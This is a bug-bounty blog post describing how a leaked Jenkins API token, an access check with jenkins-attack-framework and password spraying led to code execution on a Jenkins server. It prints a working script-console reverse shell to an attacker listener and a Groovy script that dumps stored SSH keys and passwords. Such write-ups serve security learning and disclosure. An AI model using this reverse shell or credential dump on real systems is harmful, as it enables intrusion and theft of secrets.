---
layout: post
title: "Exploiting Jenkins"
author: "joelczk"
tags: Vulns
excerpt_separator: <!--more-->
---
A story of how a wild Jenkins API token led to so much more ....
<!--more-->

## Background
This story starts when I found a wild Jenkins API token, together with the Jenkins user from a publicly-accessible main.js endpoint during my bug bounty journey. 
Before I dwelve into the specifics, let me do a quick introduction on Jenkins.

Jenkins is an open-sourced tool used to build, test and deploy software and is primarily written in Java. Currently, Jenkins has been integrated into the devops workflow 
of many large enterprises and is commonly used by many.

## Exploiting Jenkins API token
So back to the story, now that we have the Jenkins API token and the Jenkins, what can we do with it? For those who are unaware, the base64-encoded value of <username>:<Jenkins API token> 
could actually be used as the Authorization header to gain authentication to the targeted Jenkins site. All we have to do is to replace the
Authorization headers as demonstrated below:
```
Authorization: <base64 encoded value>
```

However, this would be too much of a hassle to find out the privileges of the current user. Fortunately, we have the [jenkins-attack-framework](https://github.com/Accenture/jenkins-attack-framework)
tool to help automate the entire process.
```
┌──(kali㉿kali)-[~]
└─$ python3 jaf.py AccessCheck -s <Jenkins url> -a <username>:<Jenkins API token>
<username> can View Jenkins: True
<username> can Create Job: True
<username> has some Administrative Access: False
<username> can access Script Console: False
```
Unfortunately, this seems like a dead-end for now as the current user can only view the Jenkins using the API token and does not have administrative access or 
access to the script console.

## Exploiting Weak passwords
Fortunately, we are able to obtain the list of users on the Jenkins sites using the API token. From the list of users, we are able to do a password spraying attack on
the Jenkins site and find a pair of weak credentials. 

Afterwards, we will proceed to login to the Jenkins site using the set of weak credentials. Fortunately, this time round this user has access to the script console.
With the script console, we are able to execute arbitrary code and from there, we are able to spawn a reverse shell connection to our local listener achieving the final
impact of RCE!
```
String host="<IP Address of listener>";
int port=<Port of listener>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Conclusion
As it turns out, a single Jenkins API token could potentially lead to a RCE no matter how low-privileged the API token might be. The exposure of a single Jenkins
token alone could expose essential information such as the deployment of the source code and/or sensitive keys/users.

Furthurmore, we could dump secrets that are stored in Jenkins via the script console using the code demonstrated below. This could potentially lead to lateral movement
to other assets, but that's a story for another day!

```
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
    Jenkins.instance,
    null,
    null
)

for(c in creds) {
  if(c instanceof com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey){
    println(String.format("id=%s desc=%s key=%s\n", c.id, c.description, c.privateKeySource.getPrivateKeys()))
  }
  if (c instanceof com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl){
    println(String.format("id=%s desc=%s user=%s pass=%s\n", c.id, c.description, c.username, c.password))
  }
}
```
